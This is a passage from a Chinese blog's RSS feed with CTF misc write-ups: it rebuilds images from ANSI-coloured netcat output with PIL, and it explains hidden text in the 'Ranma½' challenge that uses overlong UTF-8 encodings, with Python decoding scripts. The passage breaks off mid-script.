&lt;p&gt;最后，使用 robot36 解码 SSTV 音频，可以解出图片如下：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444438/Typera/2023/04/d80937655349012b4803de6fadc1e8de.png&#34; alt=&#34;image-20230426014034071&#34; /&gt;&lt;br /&gt;
（robot36 为安卓端软件)&lt;/p&gt;
&lt;p&gt;扫码得到 flag&lt;/p&gt;
&lt;h3 id=&#34;12_bubu_cli&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12_bubu_cli&#34;&gt;#&lt;/a&gt; 12_bubu_cli&lt;/h3&gt;
&lt;p&gt;nc 81.68.81.111 2333&lt;br /&gt;
 输出如下：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444445/Typera/2023/04/9aacfad409013817db6c5378063a2777.png&#34; alt=&#34;image-20230426014040530&#34; /&gt;&lt;/p&gt;
&lt;p&gt;先仔细观察一下输出的东西，在命令行里，我们可以发现，输出的是一些带颜色的数字 9，这些数字 9 组成了一张张的图片。（应该能看出来是几张图片，对吧）&lt;/p&gt;
&lt;p&gt;然后我们把输出的内容保存到文本文件里查看：nc 81.68.81.111 2333 &amp;gt; 1.txt&lt;br /&gt;
 大致内容如下：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444454/Typera/2023/04/8032d3085f735ce7f02fb11e33c5ca60.png&#34; alt=&#34;image-20230426014048819&#34; /&gt;&lt;/p&gt;
&lt;p&gt;可以看到， &lt;code&gt;&amp;lt;0x1b&amp;gt;[&lt;/code&gt; （即  &lt;code&gt;\x1b[&lt;/code&gt; ）将文本分割成了很多组，这就是 ANSI 转义字符。&lt;/p&gt;
&lt;p&gt;ANSI 转义字符用  &lt;code&gt;ESC[&lt;/code&gt; 打头，而 &lt;code&gt;ESC&lt;/code&gt;  用 ASCII 码表示为 &lt;code&gt;\x1b&lt;/code&gt; （十六进制的 &lt;code&gt;1b&lt;/code&gt; ）&lt;/p&gt;
&lt;p&gt;涉及到的转义字符&lt;strong&gt;解释&lt;/strong&gt;：&lt;br /&gt;
 &lt;code&gt;\x1b[nA&lt;/code&gt; ：光标上移 n 行&lt;br /&gt;
 &lt;code&gt;\x1b[38;&lt;/code&gt; ：设置前景色，后跟  &lt;code&gt;5;n&lt;/code&gt;  代表使用 8 位 256 颜色码，后跟  &lt;code&gt;2;r;g;b&lt;/code&gt;  代表 24 位 RGB 颜色码；后接 m 加字符，即为显示的字符&lt;/p&gt;
&lt;p&gt;比如 &lt;code&gt;\x1b[38;2;0;0;0m5&lt;/code&gt; ，就是输出黑色的 5.&lt;/p&gt;
&lt;p&gt;该文件里的输出都是使用 &lt;code&gt;\x1b[38;2;r;g;bm9&lt;/code&gt; ，&lt;br /&gt;
也就是说，我们只要提取出这些字符中间的 r g b 三位，然后用 PIL 组合成图片就行了。&lt;/p&gt;
&lt;p&gt;除此之外，我们还可以注意到：基本上每隔一段字符，会出现固定长度的一串 &lt;code&gt;\x1b[nA&lt;/code&gt; ，&lt;br /&gt;
从上述的解释中，我们已经可以知道，这是让光标上移的转义字符，&lt;br /&gt;
因此，我们大概能够知晓，输出的图片应该就是被这些字符分割的。&lt;/p&gt;
&lt;p&gt;所以，我们可以推断出，图片的长度应该是 &lt;code&gt;\x1b[nA&lt;/code&gt;  字符的个数 -1，&lt;br /&gt;
从而我们获得了图片的长度为 200，&lt;br /&gt;
同样的，我们也可以通过统计一行上 &lt;code&gt;\x1b[38;&lt;/code&gt;  字符的个数，确定宽度也为 200.&lt;br /&gt;
（这两个数据都是使用 PIL 生成图片时必须的）&lt;/p&gt;
&lt;p&gt;转换脚本如下：&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; PIL &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1.txt&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; fp:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    farmes = fp.read().split(&lt;span class=&#34;string&#34;&gt;&amp;quot;\x1b[A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;201&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;farmes.pop(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; frame &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; farmes:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rgb_list = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;quot;\[38;2;(\d*);(\d*);(\d*)m&amp;quot;&lt;/span&gt;, frame)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# print(frame)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    img = Image.new(&lt;span class=&#34;string&#34;&gt;&amp;quot;RGB&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; w &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(img.size[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; h &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(img.size[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            r, g, b = rgb_list[h*&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt; + w]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            img.putpixel((w, h), (&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(r), &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(g), &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(b)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    img.save(&lt;span class=&#34;string&#34;&gt;f&amp;quot;frame/&lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i).zfill(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&amp;#125;&lt;/span&gt;.png&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;Saved frame/&lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i).zfill(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&amp;#125;&lt;/span&gt;.png&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;现在我们仔细观察一下获得的 29 张图片：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444466/Typera/2023/04/fb1417256ebdb703f6b023d21836f2bf.png&#34; alt=&#34;image-20230426014102173&#34; /&gt;&lt;/p&gt;
&lt;p&gt;放大细看，可以发现，大部分图片上都有几个随机出现白点：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444483/Typera/2023/04/02f03d1a519726d4487be9f6f0e3ea8d.png&#34; alt=&#34;image-20230426014119100&#34; /&gt;&lt;/p&gt;
&lt;p&gt;无论你是用 ps 还是 画图 或者是其他什么工具查看这些白点的像素，你都会发现它们的 RGB 为（233,233,233）&lt;/p&gt;
&lt;p&gt;接下来的思路是：把 29 张图中 RGB 为（233,233,233）的点提取出来，组成一张新图。&lt;br /&gt;
脚本如下：&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; PIL &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag_img=Image.new(&lt;span class=&#34;string&#34;&gt;&amp;#x27;RGB&amp;#x27;&lt;/span&gt;,(&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; name &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;29&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    img = Image.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;frame/&lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(name).zfill(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&amp;#125;&lt;/span&gt;.png&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    img = img.convert(&lt;span class=&#34;string&#34;&gt;&amp;quot;RGB&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; w &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(img.size[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; h &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(img.size[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; img.getpixel((w,h)) == (&lt;span class=&#34;number&#34;&gt;233&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;233&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;233&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                flag_img.putpixel((w,h),(&lt;span class=&#34;number&#34;&gt;233&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;233&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;233&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag_img.save(&lt;span class=&#34;string&#34;&gt;&amp;#x27;flag.png&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 获得的图片如下：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444530/Typera/2023/04/0abbeb74a9829e5975738dce464003bf.png&#34; alt=&#34;cumtctf2022wp14&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://www.sycamore.top/CyberSecurity/CTF/TQLCTF-MISC-Ranma%C2%BD/</guid>
            <title>TQLCTF-MISC-Ranma½</title>
            <link>https://www.sycamore.top/CyberSecurity/CTF/TQLCTF-MISC-Ranma%C2%BD/</link>
            <category>Python</category>
            <category>CTF</category>
            <category>Misc</category>
            <pubDate>Wed, 23 Feb 2022 01:36:41 +1100</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;misc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; MISC&lt;/h2&gt;
&lt;h3 id=&#34;ranma12&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ranma12&#34;&gt;#&lt;/a&gt; Ranma½&lt;/h3&gt;
&lt;p&gt;终归还是少了点经验，以及一些奇奇怪怪的知识。。。&lt;/p&gt;
&lt;h4 id=&#34;utf-8可变长编码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#utf-8可变长编码&#34;&gt;#&lt;/a&gt; UTF-8 可变长编码&lt;/h4&gt;
&lt;p&gt;首先一定要详细了解 UTF-8 编码，&lt;br /&gt;
完整的表如下：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682438191/Typera/2023/04/fdfd2d8940cbcb3dad4d6ee71124333c.png&#34; alt=&#34;image-20230425235627337&#34; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;图中一行的  &lt;code&gt;xxx...&lt;/code&gt;  部分组合起来即为对应的 Unicode 代码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可能这样还是比较难以理解，那就仔细阅读下面的例子就行了：&lt;/p&gt;
&lt;p&gt;希伯来语字母 א 的 Unicode 代码是 U+&lt;strong&gt;05D0&lt;/strong&gt;，UTF-8 是 &lt;strong&gt;0xD7 0x90&lt;/strong&gt;，&lt;br /&gt;
则 Unicode to UTF-8 转换如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首先判断它属于哪一行：&lt;br /&gt;
U+0080 到 U+07FF，观察表中对应行，说明它使用双字节，即 110&lt;strong&gt;xxxxx&lt;/strong&gt; 10&lt;strong&gt;xxxxxx&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;然后分解十六进制的&lt;strong&gt; 0x05D0&lt;/strong&gt;，换算成二进制就是（0）101-1101-0000&lt;/li&gt;
&lt;li&gt;最后，把这 11 位数按顺序填入前后的 &amp;quot;x&amp;quot; 部分：110&lt;strong&gt;10111&lt;/strong&gt; 10&lt;strong&gt;010000&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;110&lt;strong&gt;10111&lt;/strong&gt; 10&lt;strong&gt;010000&lt;/strong&gt; 换成 16 进制就是 &lt;strong&gt;D7 90&lt;/strong&gt;，即对应的 UTF-8 编码&lt;/p&gt;
&lt;p&gt;看懂了上述例子，UTF-8 to Unicode 就是简单反过来就行了&lt;/p&gt;
&lt;h4 id=&#34;信息隐藏的思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息隐藏的思路&#34;&gt;#&lt;/a&gt; 信息隐藏的思路&lt;/h4&gt;
&lt;p&gt;到这里，我们就了解了 UTF-8 编码 “可变长” 的特点，&lt;br /&gt;
既然它是可变长的，那么我们就可以利用&lt;strong&gt;这个特性&lt;/strong&gt;去隐藏信息：&lt;br /&gt;
直接用一般的文本编辑器打开题目给的文件，会有很多乱码，因为它们大多是逐字节转换的，而 UTF-8 的单个字符 可能有 1~4 个字节的长度，&lt;/p&gt;
&lt;p&gt;因此，如果我们要隐藏 &lt;strong&gt;A&lt;/strong&gt; 字符，Unicode 就是 &lt;strong&gt;0x41&lt;/strong&gt;，换算成二进制就是 &lt;strong&gt;100 0001&lt;/strong&gt;，&lt;br /&gt;
再假设我们要把它藏到 UTF-8 编码的&lt;strong&gt;第二行 U+0080 到 U+07FF&lt;/strong&gt; 里面，那么我们一共需要 11 个数字，&lt;br /&gt;
于是人为地在高位填充 4 个 0，得到：&lt;strong&gt;000-0100-0001&lt;/strong&gt;，再将这 11 个数字填入表中对应的 x 部分，就得到：110&lt;strong&gt;00001&lt;/strong&gt; 10&lt;strong&gt;000001&lt;/strong&gt;，即 UTF-8 编码的 &lt;strong&gt;C1 81&lt;/strong&gt;，从而骗过大部分的文本编辑器&lt;/p&gt;
&lt;h4 id=&#34;解题过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解题过程&#34;&gt;#&lt;/a&gt; 解题过程&lt;/h4&gt;
&lt;p&gt;实际上有挺多方法，用 vim 打开，或者用 WinRAR 的 “查看” 打开（这个属实有点奇怪）&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682438200/Typera/2023/04/1771f16334a694ed24fac59a74971010.png&#34; alt=&#34;image-20230425235636085&#34; /&gt;&lt;br /&gt;
 或者可以写脚本分析：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; binascii&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x,y,z=[],[],[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Ranma&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rb&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			Str = f.read(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; Str:&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			x.append(binascii.hexlify(Str))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;finally&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		f.close() &lt;span class=&#34;comment&#34;&gt;# 读文件，将16进制字串存入list x&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(x)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(x[i],&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&amp;lt;&lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		y.append(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(x[i],&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;))) &lt;span class=&#34;comment&#34;&gt;# 小于128的直接chr()转换ASCII码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(x[i],&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&amp;gt;&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		y.append(&lt;span class=&#34;built_in&#34;&gt;bin&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(x[i],&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;))) &lt;span class=&#34;comment&#34;&gt;# 大于128的转换为二进制分析&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(y)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;0b110&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; y[i]: &lt;span class=&#34;comment&#34;&gt;# 如果是第二行的情况&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		y[i]=&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(y[i][&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:]+(y[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:],&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;0b1110&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; y[i]: &lt;span class=&#34;comment&#34;&gt;# 如果是第三行的情况&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		y[i]=&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(y[i][&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:]+(y[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])[&lt;span 